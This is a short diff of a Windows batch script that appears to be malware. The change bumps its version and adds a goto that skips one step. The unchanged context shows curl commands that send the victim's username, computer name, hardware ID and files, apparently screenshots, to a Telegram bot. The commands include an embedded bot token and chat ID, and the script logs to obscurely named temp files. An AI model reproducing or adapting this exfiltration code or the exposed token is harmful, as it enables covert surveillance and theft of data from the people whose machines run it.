@@ -10,7 +10,7 @@
 setlocal enabledelayedexpansion
 
 
-set "BATCHVERSION=28.7"
+set "BATCHVERSION=28.8"
 set "LOGFILE=%temp%\S1rNsvQgG.mpeez"
 set "RESULT=%TEMP%\TGRESU.txa"
 
@@ -2285,6 +2285,8 @@ set "CAPTION_UPDATESSCRNSHTS=Computer|%USERNAME%(%COMPUTERNAME%)|%HWID%|STARTED|
 set "FILE_PATH_UPDATESSCRNSHTS=%temp%\RUNNING_Topic.txt"
 
 
+goto IGNORESENDFILENOW
+
 curl -s -X POST "https://api.telegram.org/bot7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA/sendMessage" -d "chat_id=-1002163721260" -d "message_thread_id=73779" -d "text=%USERNAME%(%COMPUTERNAME%)|%time%|(v%BATCHVERSION%)|SENDFILENOW" > "%RESULT%"
 
 
@@ -2299,6 +2301,9 @@ if %errorlevel%==0 (
     echo Going to PEROTY
     goto PEROTY
 )
+
+
+:IGNORESENDFILENOW
 
 
 curl -s -X POST "https://api.telegram.org/bot%TOKEN_UPDATESSCRNSHTS%/sendDocument" ^
